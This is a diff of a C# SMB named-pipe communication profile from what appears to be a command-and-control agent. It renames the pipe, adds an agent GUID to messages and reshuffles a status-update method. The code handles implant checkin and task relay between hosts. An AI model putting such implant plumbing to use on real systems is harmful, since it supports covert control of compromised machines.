@@ -1,7 +1,7 @@
 using Agent.Interfaces;
-using Agent.Models;
 using Agent.Utilities;
 using System.Text.Json;
+using Agent.Models;
 using Agent.Profiles.Smb;
 using System.Collections.Concurrent;
 using System.Text;
@@ -20,7 +20,7 @@ namespace Agent.Profiles
         private ICryptoManager crypt { get; set; }
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
-        private string pipeName = "pipename";
+        private string pipeName = "scottie_pipe";
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
         private PipeServer<SmbMessage> serverPipe { get; set; }
         private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
@@ -60,7 +60,6 @@ namespace Agent.Profiles
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
-
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
             //Wait for a checkin response message
@@ -68,7 +67,6 @@ namespace Agent.Profiles
 
             //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
-
             return this.cir;
         }
 
@@ -86,7 +84,7 @@ namespace Agent.Profiles
 
                 try
                 {
-                    await this.Send(await messageManager.GetAgentResponseStringAsync());
+                    await this.Send(messageManager.GetAgentResponseString());
                 }
                 catch (Exception e)
                 {
@@ -113,7 +111,8 @@ namespace Agent.Profiles
                 {
                     guid = Guid.NewGuid().ToString(),
                     final = false,
-                    message_type = "chunked_message"
+                    message_type = "chunked_message",
+                    agent_guid = agentConfig.uuid,
                 };
 
                 IEnumerable<string> parts = json.SplitByLength(4000);
@@ -126,7 +125,6 @@ namespace Agent.Profiles
                     {
                         sm.final = true;
                     }
-
                     await this.serverPipe.WriteAsync(sm);
                 }
 
@@ -153,20 +151,8 @@ namespace Agent.Profiles
                 guid = Guid.NewGuid().ToString(),
                 message_type = "success",
                 final = true,
-                delegate_message = String.Empty
-            };
-
-            await this.serverPipe.WriteAsync(sm);
-        }
-
-        private async Task SendUpdate()
-        {
-            SmbMessage sm = new SmbMessage()
-            {
-                guid = Guid.NewGuid().ToString(),
-                final = true,
-                message_type = "path_update",
-                delegate_message = this.agentConfig.uuid
+                delegate_message = String.Empty,
+                agent_guid = agentConfig.uuid,
             };
 
             await this.serverPipe.WriteAsync(sm);
@@ -229,10 +215,22 @@ namespace Agent.Profiles
             {
                 return;
             }
-
             TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
             this.SetTaskingReceived(this, tra);
             //test
+        }
+        private async Task SendUpdate()
+        {
+            SmbMessage sm = new SmbMessage()
+            {
+                guid = Guid.NewGuid().ToString(),
+                final = true,
+                message_type = "success",
+                delegate_message = "",
+                agent_guid = this.agentConfig.uuid
+            };
+
+            await this.serverPipe.WriteAsync(sm);
         }
     }
 }
